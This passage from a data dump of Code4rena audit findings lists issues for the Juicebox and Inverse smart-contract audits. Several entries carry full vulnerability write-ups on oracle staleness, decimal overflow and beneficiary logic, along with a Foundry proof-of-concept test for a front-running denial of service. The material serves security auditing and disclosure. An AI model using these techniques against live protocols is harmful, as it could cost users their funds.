with wrong argument order"}, {"title": "Lack of sanity check for total number of tiers after adding new tiers can lead to malfunction of protocol", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/72", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-12"], "target": "2022-10-juicebox-findings", "body": "Lack of sanity check for total number of tiers after adding new tiers can lead to malfunction of protocol"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/71", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-07"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/70", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-11"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/66", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-10"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Iterations over all tiers in recordMintBestAvailableTier can render system unusable", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/64", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "M-04"], "target": "2022-10-juicebox-findings", "body": "Iterations over all tiers in recordMintBestAvailableTier can render system unusable"}, {"title": "Changing default reserved token beneficiary may result in wrong beneficiary for tier", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/63", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "satisfactory", "selected for report", "M-03"], "target": "2022-10-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-nft-rewards/blob/89cea0e2a942a9dc9e8d98ae2c5f1b8f4d916438/contracts/JBTiered721DelegateStore.sol#L701   # Vulnerability details  ## Impact When the `reservedTokenBeneficiary` of a tier is equal to `defaultReservedTokenBeneficiaryOf[msg.sender]`, it is not explicitly set for this tier. This generally works well because in the function `reservedTokenBeneficiaryOf(address _nft, uint256 _tierId)`, `defaultReservedTokenBeneficiaryOf[_nft]` is used as a backup when `_reservedTokenBeneficiaryOf[_nft][_tierId]` is not set. However, it will lead to the wrong beneficiary when `defaultReservedTokenBeneficiaryOf[msg.sender]` is later changed, as this new beneficiary will be used for the tier, which is not the intended one.  ## Proof Of Concept `defaultReservedTokenBeneficiaryOf[address(delegate)]` is originally set to `address(Bob)` when the following happens: 1.) A new tier 42 is added with `_tierToAdd.reservedTokenBeneficiary = address(Bob)`. Because this is equal to `defaultReservedTokenBeneficiaryOf[address(delegate)]`, `_reservedTokenBeneficiaryOf[msg.sender][_tierId]` is not set. 2.) The owner calls `setDefaultReservedTokenBeneficiary` to change the default beneficiary (i.e., the value `defaultReservedTokenBeneficiaryOf[address(delegate)]`) to `address(Alice)`. 3.) Now, every call to `reservedTokenBeneficiaryOf(address(delegate), 42)` will return `address(Alice)`, meaning she will get these reserved tokens. This is of course wrong, the tier was explicitly created with Bob as the beneficiary.  ## Recommended Mitigation Steps Also set `_reservedTokenBeneficiaryOf[msg.sender][_tierId]` when it is equal to the current default beneficiary."}, {"title": "JBTiered721Delegate.tokenURI violates EIP-721", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/61", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "sponsor acknowledged", "grade-a", "Q-09"], "target": "2022-10-juicebox-findings", "body": "JBTiered721Delegate.tokenURI violates EIP-721"}, {"title": "Should check that _owner isnt address(0)", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/59", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-08"], "target": "2022-10-juicebox-findings", "body": "Should check that _owner isnt address(0)"}, {"title": "Use _safeMint() rather than _mint() for ERC721 tokens", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/55", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-07"], "target": "2022-10-juicebox-findings", "body": "Use _safeMint() rather than _mint() for ERC721 tokens"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/54", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-06"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/53", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-06"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Making a payment to the protocol with `_dontMint` parameter will result in lost fund for user.", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/45", "labels": ["bug", "3 (High Risk)", "high quality report", "primary issue", "selected for report", "H-01"], "target": "2022-10-juicebox-findings", "body": "Making a payment to the protocol with `_dontMint` parameter will result in lost fund for user."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/42", "labels": ["bug", "G (Gas Optimization)", "high quality report", "grade-a", "G-05"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "`JBTiered721DelegateDeployer.deployDelegateFor` cast every governance type to `JB721GlobalGovernance`", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/41", "labels": ["bug", "disagree with severity", "downgraded by judge", "QA (Quality Assurance)", "grade-a", "Q-05"], "target": "2022-10-juicebox-findings", "body": "`JBTiered721DelegateDeployer.deployDelegateFor` cast every governance type to `JB721GlobalGovernance`"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/34", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-04"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/32", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-03"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "The tier setting parameter are unsafely downcasted from type uint256 to type uint80 / uint48 / uint40 / uint16", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/31", "labels": ["bug", "2 (Med Risk)", "high quality report", "primary issue", "selected for report", "M-02"], "target": "2022-10-juicebox-findings", "body": "The tier setting parameter are unsafely downcasted from type uint256 to type uint80 / uint48 / uint40 / uint16"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/27", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-02"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/26", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-04"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Multiples initializations of `JBTiered721Delegate`", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/24", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "edited-by-warden", "selected for report", "M-01"], "target": "2022-10-juicebox-findings", "body": "Multiples initializations of `JBTiered721Delegate`"}, {"title": "JB NFT may be minted to non ERC721 receivers", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/18", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-03"], "target": "2022-10-juicebox-findings", "body": "JB NFT may be minted to non ERC721 receivers"}, {"title": "Governance voting outcome can be manipulated", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/11", "labels": ["bug", "disagree with severity", "downgraded by judge", "QA (Quality Assurance)", "satisfactory", "grade-b", "Q-02"], "target": "2022-10-juicebox-findings", "body": "Governance voting outcome can be manipulated"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/10", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-01"], "target": "2022-10-juicebox-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/9", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-01"], "target": "2022-10-juicebox-findings", "body": "QA Report"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/1", "labels": [], "target": "2022-10-juicebox-findings", "body": "Agreements & Disclosures"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/604", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-55"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/595", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-54"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/594", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-54"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/593", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-53"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/592", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-53"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/590", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-52"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/588", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-51"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Protocol's usability becomes very limited when access to Chainlink oracle data feed is blocked", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/586", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "satisfactory", "sponsor acknowledged", "selected for report", "M-18"], "target": "2022-10-inverse-findings", "body": "Protocol's usability becomes very limited when access to Chainlink oracle data feed is blocked"}, {"title": "Chainlink oracle data feed is not sufficiently validated and can return stale `price`", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/584", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor confirmed", "selected for report", "M-17"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L78-L105 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L112-L144 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L344-L347 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L323-L327 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L353-L363   # Vulnerability details  ## Impact Calling the `Oracle` contract's `viewPrice` or `getPrice` function executes `uint price = feeds[token].feed.latestAnswer()` and `require(price > 0, \"Invalid feed price\")`. Besides that Chainlink's `latestAnswer` function is deprecated, only verifying that `price > 0` is true is also not enough to guarantee that the returned `price` is not stale. Using a stale `price` can cause the calculations for the credit and withdrawal limits to be inaccurate, which, for example, can mistakenly consider a user's debt to be under water and unexpectedly allow the user's debt to be liquidated.  To avoid using a stale answer returned by the Chainlink oracle data feed, according to [Chainlink's documentation](https://docs.chain.link/docs/historical-price-data): 1. The `latestRoundData` function can be used instead of the deprecated `latestAnswer` function. 2. `roundId` and `answeredInRound` are also returned. \"You can check `answeredInRound` against the current `roundId`. If `answeredInRound` is less than `roundId`, the answer is being carried over. If `answeredInRound` is equal to `roundId`, then the answer is fresh.\" 3. \"A read can revert if the caller is requesting the details of a round that was invalid or has not yet been answered. If you are deriving a round ID without having observed it before, the round might not be complete. To check the round, validate that the timestamp on that round is not 0.\"    https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L78-L105 ```solidity     function viewPrice(address token, uint collateralFactorBps) external view returns (uint) {         if(fixedPrices[token] > 0) return fixedPrices[token];         if(feeds[token].feed != IChainlinkFeed(address(0))) {             // get price from feed             uint price = feeds[token].feed.latestAnswer();             require(price > 0, \"Invalid feed price\");             // normalize price             uint8 feedDecimals = feeds[token].feed.decimals();             uint8 tokenDecimals = feeds[token].tokenDecimals;             uint8 decimals = 36 - feedDecimals - tokenDecimals;             uint normalizedPrice = price * (10 ** decimals);             uint day = block.timestamp / 1 days;             // get today's low             uint todaysLow = dailyLows[token][day];             // get yesterday's low             uint yesterdaysLow = dailyLows[token][day - 1];             // calculate new borrowing power based on collateral factor             uint newBorrowingPower = normalizedPrice * collateralFactorBps / 10000;             uint twoDayLow = todaysLow > yesterdaysLow && yesterdaysLow > 0 ? yesterdaysLow : todaysLow;             if(twoDayLow > 0 && newBorrowingPower > twoDayLow) {                 uint dampenedPrice = twoDayLow * 10000 / collateralFactorBps;                 return dampenedPrice < normalizedPrice ? dampenedPrice: normalizedPrice;             }             return normalizedPrice;          }         revert(\"Price not found\");     } ```  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L112-L144 ```solidity     function getPrice(address token, uint collateralFactorBps) external returns (uint) {         if(fixedPrices[token] > 0) return fixedPrices[token];         if(feeds[token].feed != IChainlinkFeed(address(0))) {             // get price from feed             uint price = feeds[token].feed.latestAnswer();             require(price > 0, \"Invalid feed price\");             // normalize price             uint8 feedDecimals = feeds[token].feed.decimals();             uint8 tokenDecimals = feeds[token].tokenDecimals;             uint8 decimals = 36 - feedDecimals - tokenDecimals;             uint normalizedPrice = price * (10 ** decimals);             // potentially store price as today's low             uint day = block.timestamp / 1 days;             uint todaysLow = dailyLows[token][day];             if(todaysLow == 0 || normalizedPrice < todaysLow) {                 dailyLows[token][day] = normalizedPrice;                 todaysLow = normalizedPrice;                 emit RecordDailyLow(token, normalizedPrice);             }             // get yesterday's low             uint yesterdaysLow = dailyLows[token][day - 1];             // calculate new borrowing power based on collateral factor             uint newBorrowingPower = normalizedPrice * collateralFactorBps / 10000;             uint twoDayLow = todaysLow > yesterdaysLow && yesterdaysLow > 0 ? yesterdaysLow : todaysLow;             if(twoDayLow > 0 && newBorrowingPower > twoDayLow) {                 uint dampenedPrice = twoDayLow * 10000 / collateralFactorBps;                 return dampenedPrice < normalizedPrice ? dampenedPrice: normalizedPrice;             }             return normalizedPrice;          }         revert(\"Price not found\");     } ```  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L344-L347 ```solidity     function getCreditLimitInternal(address user) internal returns (uint) {         uint collateralValue = getCollateralValueInternal(user);         return collateralValue * collateralFactorBps / 10000;     } ```  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L323-L327 ```solidity     function getCollateralValueInternal(address user) internal returns (uint) {         IEscrow escrow = predictEscrow(user);         uint collateralBalance = escrow.balance();         return collateralBalance * oracle.getPrice(address(collateral), collateralFactorBps) / 1 ether;     } ```  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L353-L363 ```solidity     function getWithdrawalLimitInternal(address user) internal returns (uint) {         IEscrow escrow = predictEscrow(user);         uint collateralBalance = escrow.balance();         if(collateralBalance == 0) return 0;         uint debt = debts[user];         if(debt == 0) return collateralBalance;         if(collateralFactorBps == 0) return 0;         uint minimumCollateral = debt * 1 ether / oracle.getPrice(address(collateral), collateralFactorBps) * 10000 / collateralFactorBps;         if(collateralBalance <= minimumCollateral) return 0;         return collateralBalance - minimumCollateral;     } ```  ## Proof of Concept The following steps can occur for the described scenario. 1. Alice calls the `depositAndBorrow` function to deposit some WETH as the collateral and borrows some DOLA against the collateral. 2. Bob calls the `liquidate` function for trying to liquidate Alice's debt. Because the Chainlink oracle data feed returns an up-to-date price at this moment, the `getCreditLimitInternal` function calculates Alice's credit limit accurately, which does not cause Alice's debt to be under water. Hence, Bob's `liquidate` transaction reverts. 3. After some time, Bob calls the `liquidate` function again for trying to liquidate Alice's debt. This time, because the Chainlink oracle data feed returns a positive but stale price, the `getCreditLimitInternal` function calculates Alice's credit limit inaccurately, which mistakenly causes Alice's debt to be under water. 4. Bob's `liquidate` transaction is executed successfully so he gains some of Alice's WETH collateral. Alice loses such WETH collateral amount unexpectedly because her debt should not be considered as under water if the stale price was not used.  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L82-L83 and https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L116-L117 can be updated to the following code. ```solidity             (uint80 roundId, int256 answer, , uint256 updatedAt, uint80 answeredInRound) = feeds[token].feed.latestRoundData();             require(answeredInRound >= roundId, \"answer is stale\");             require(updatedAt > 0, \"round is incomplete\");             require(answer > 0, \"Invalid feed answer\");              uint256 price = uint256(answer); ```"}, {"title": "Calling `repay` function sends less DOLA to `Market` contract when `forceReplenish` function is not called while it could be called", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/583", "labels": ["bug", "2 (Med Risk)", "primary issue", "sponsor disputed", "selected for report", "M-16"], "target": "2022-10-inverse-findings", "body": "Calling `repay` function sends less DOLA to `Market` contract when `forceReplenish` function is not called while it could be called"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/569", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-50"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/567", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-49"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/559", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-52"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/554", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-51"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/548", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-48"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/539", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-50"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/536", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-47"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/535", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-46"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Oracle assumes token and feed decimals will be limited to 18 decimals", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/533", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "M-15"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L87 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L121   # Vulnerability details  ## Impact  The `Oracle` contract normalizes prices in both `viewPrices` and `getPrices` functions to adjust for potential decimal differences between feed and token decimals and the expected return value.   However these functions assume that `feedDecimals` and `tokenDecimals` won't exceed 18 since the normalization calculation is `36 - feedDecimals - tokenDecimals`, or that at worst case the sum of both won't exceed 36.  This assumption should be safe for certain cases, for example WETH is 18 decimals and the ETH/USD chainlink is 8 decimals, but may cause an overflow (and a revert) for the general case, rendering the Oracle useless in these cases.  ## Proof of Concept  If `feedDecimals + tokenDecimals > 36` then the expression `36 - feedDecimals - tokenDecimals` will be negative and (due to Solidity 0.8 default checked math) will cause a revert.  ## Recommended Mitigation Steps  In case `feedDecimals + tokenDecimals` exceeds 36, then the proper normalization procedure would be to **divide** the price by `10 ** decimals`. Something like this:  ``` uint normalizedPrice;  if (feedDecimals + tokenDecimals > 36) {     uint decimals = feedDecimals + tokenDecimals - 36;     normalizedPrice = price / (10 ** decimals) } else {     uint8 decimals = 36 - feedDecimals - tokenDecimals;     normalizedPrice = price * (10 ** decimals); } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/532", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-49"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/531", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-a", "Q-45"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/528", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-48"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/527", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-44"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/523", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-43"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/517", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-42"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/516", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-41"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/515", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-47"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/513", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-40"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/505", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-46"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/498", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-39"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/497", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-45"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/496", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-38"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/493", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-37"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/492", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-44"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/491", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-36"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/490", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-43"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/489", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-35"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/488", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-42"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/486", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-34"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/485", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-41"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/484", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-33"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/475", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-40"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/471", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-39"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Two day low oracle used in `Market.liquidate()` makes the system highly at risk in an oracle attack ", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/469", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "sponsor disputed", "selected for report", "M-14"], "target": "2022-10-inverse-findings", "body": "Two day low oracle used in `Market.liquidate()` makes the system highly at risk in an oracle attack "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/465", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-38"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/460", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-32"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/456", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-31"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/452", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-30"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/451", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-37"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/444", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-29"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "`Market::forceReplenish` can be DoSed", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/443", "labels": ["bug", "2 (Med Risk)", "satisfactory", "sponsor confirmed", "selected for report", "M-13"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L562   # Vulnerability details  ## Impact If a user wants to completely forceReplenish a borrower with deficit, the borrower or any other malicious party can front run this with a dust amount to prevent the replenish.  ## Proof of Concept ```javascript     function testForceReplenishFrontRun() public {         gibWeth(user, wethTestAmount);         gibDBR(user, wethTestAmount / 14);         uint initialReplenisherDola = DOLA.balanceOf(replenisher);          vm.startPrank(user);         deposit(wethTestAmount);         uint borrowAmount = getMaxBorrowAmount(wethTestAmount);         market.borrow(borrowAmount);         uint initialUserDebt = market.debts(user);         uint initialMarketDola = DOLA.balanceOf(address(market));         vm.stopPrank();          vm.warp(block.timestamp + 5 days);         uint deficitBefore = dbr.deficitOf(user);         vm.startPrank(replenisher);          market.forceReplenish(user,1); // front run DoS          vm.expectRevert(\"Amount > deficit\");         market.forceReplenish(user, deficitBefore); // fails due to amount being larger than deficit                  assertEq(DOLA.balanceOf(replenisher), initialReplenisherDola, \"DOLA balance of replenisher changed\");         assertEq(DOLA.balanceOf(address(market)), initialMarketDola, \"DOLA balance of market changed\");         assertEq(DOLA.balanceOf(replenisher) - initialReplenisherDola, initialMarketDola - DOLA.balanceOf(address(market)),             \"DOLA balance of market did not decrease by amount paid to replenisher\");         assertEq(dbr.deficitOf(user), deficitBefore-1, \"Deficit of borrower was not fully replenished\");          // debt only increased by dust         assertEq(market.debts(user) - initialUserDebt, 1 * replenishmentPriceBps / 10000, \"Debt of borrower did not increase by replenishment price\");     } ``` This requires that the two txs end up in the same block. If they end up in different blocks the front run transaction will need to account for the increase in deficit between blocks.   ## Tools Used vscode, forge  ## Recommended Mitigation Steps Use `min(deficit,amount)` as amount to replenish "}, {"title": " Users could get some `DOLA` even if their are on liquidation position", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/419", "labels": ["bug", "2 (Med Risk)", "satisfactory", "sponsor confirmed", "selected for report", "M-12"], "target": "2022-10-inverse-findings", "body": "# Lines of code  